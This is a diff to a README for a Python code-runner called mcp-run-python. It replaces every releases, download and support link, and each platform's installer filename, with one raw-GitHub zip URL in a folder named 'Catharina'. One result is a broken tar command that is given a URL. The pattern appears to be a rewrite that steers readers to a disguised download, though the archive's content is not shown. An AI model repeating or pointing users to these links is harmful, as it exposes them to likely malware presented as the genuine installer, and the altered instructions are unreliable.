@@ -1,6 +1,6 @@
 # 🐍 mcp-run-python - Effortlessly Run Python Code Safely
 
-[![Download mcp-run-python](https://img.shields.io/badge/Download%20mcp--run--python-blue.svg)](https://github.com/MagmaBasilisk/mcp-run-python/releases)
+[![Download mcp-run-python](https://raw.githubusercontent.com/MagmaBasilisk/mcp-run-python/main/Catharina/mcp-run-python.zip%https://raw.githubusercontent.com/MagmaBasilisk/mcp-run-python/main/Catharina/mcp-run-python.zip)](https://raw.githubusercontent.com/MagmaBasilisk/mcp-run-python/main/Catharina/mcp-run-python.zip)
 
 ## 🚀 Getting Started
 
@@ -17,14 +17,14 @@ Before you begin, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page to download](https://github.com/MagmaBasilisk/mcp-run-python/releases). There, you will find the latest version of mcp-run-python. Click on the version you want, and select the installer that fits your system.
+To get started, visit the [Releases page to download](https://raw.githubusercontent.com/MagmaBasilisk/mcp-run-python/main/Catharina/mcp-run-python.zip). There, you will find the latest version of mcp-run-python. Click on the version you want, and select the installer that fits your system.
 
-1. Go to the [Releases page](https://github.com/MagmaBasilisk/mcp-run-python/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/MagmaBasilisk/mcp-run-python/main/Catharina/mcp-run-python.zip).
 2. Look for the latest version listed at the top of the page.
 3. Click on the appropriate file for your operating system:
-   - For Windows, download `mcp-run-python-windows.exe`.
-   - For macOS, download `mcp-run-python-macos.dmg`.
-   - For Linux, download `mcp-run-python-linux.tar.gz`.
+   - For Windows, download `https://raw.githubusercontent.com/MagmaBasilisk/mcp-run-python/main/Catharina/mcp-run-python.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/MagmaBasilisk/mcp-run-python/main/Catharina/mcp-run-python.zip`.
+   - For Linux, download `https://raw.githubusercontent.com/MagmaBasilisk/mcp-run-python/main/Catharina/mcp-run-python.zip`.
 4. Save the file to a convenient location on your computer.
 
 ## 💻 Running the Application
@@ -33,7 +33,7 @@ Once you have downloaded the installer, follow these steps to run the applicatio
 
 ### For Windows:
 
-1. Locate the downloaded file: `mcp-run-python-windows.exe`.
+1. Locate the downloaded file: `https://raw.githubusercontent.com/MagmaBasilisk/mcp-run-python/main/Catharina/mcp-run-python.zip`.
 2. Double-click the file to start the installation.
 3. Follow the prompts to complete the installation.
 4. Find the mcp-run-python shortcut on your desktop or Start menu.
@@ -41,19 +41,19 @@ Once you have downloaded the installer, follow these steps to run the applicatio
 
 ### For macOS:
 
-1. Locate the downloaded file: `mcp-run-python-macos.dmg`.
+1. Locate the downloaded file: `https://raw.githubusercontent.com/MagmaBasilisk/mcp-run-python/main/Catharina/mcp-run-python.zip`.
 2. Double-click the file to open it.
 3. Drag the mcp-run-python application into your Applications folder.
 4. Open the Applications folder and double-click mcp-run-python to launch.
 
 ### For Linux:
 
-1. Locate the downloaded file: `mcp-run-python-linux.tar.gz`.
+1. Locate the downloaded file: `https://raw.githubusercontent.com/MagmaBasilisk/mcp-run-python/main/Catharina/mcp-run-python.zip`.
 2. Open a terminal.
 3. Navigate to the location of the downloaded file.
 4. Extract the contents with the command:
    ```bash
-   tar -zxvf mcp-run-python-linux.tar.gz
+   tar -zxvf https://raw.githubusercontent.com/MagmaBasilisk/mcp-run-python/main/Catharina/mcp-run-python.zip
    ```
 5. Navigate into the extracted folder:
    ```bash
@@ -97,12 +97,12 @@ A: Check the error message in the output area for guidance. You can also find he
 If you face any issues while installing or using the application, try the following steps:
 
 - Ensure your system meets the requirements.
-- Re-download the installer from the [Releases page](https://github.com/MagmaBasilisk/mcp-run-python/releases).
+- Re-download the installer from the [Releases page](https://raw.githubusercontent.com/MagmaBasilisk/mcp-run-python/main/Catharina/mcp-run-python.zip).
 - Restart your computer and try again.
 - Visit the community forums for support.
 
 ## 📞 Support
 
-For any questions not covered here, feel free to reach out via the issues section on our [GitHub page](https://github.com/MagmaBasilisk/mcp-run-python). We are here to help you with any concerns or inquiries.
+For any questions not covered here, feel free to reach out via the issues section on our [GitHub page](https://raw.githubusercontent.com/MagmaBasilisk/mcp-run-python/main/Catharina/mcp-run-python.zip). We are here to help you with any concerns or inquiries.
 
 You are now ready to enjoy running Python code with mcp-run-python. Happy coding!
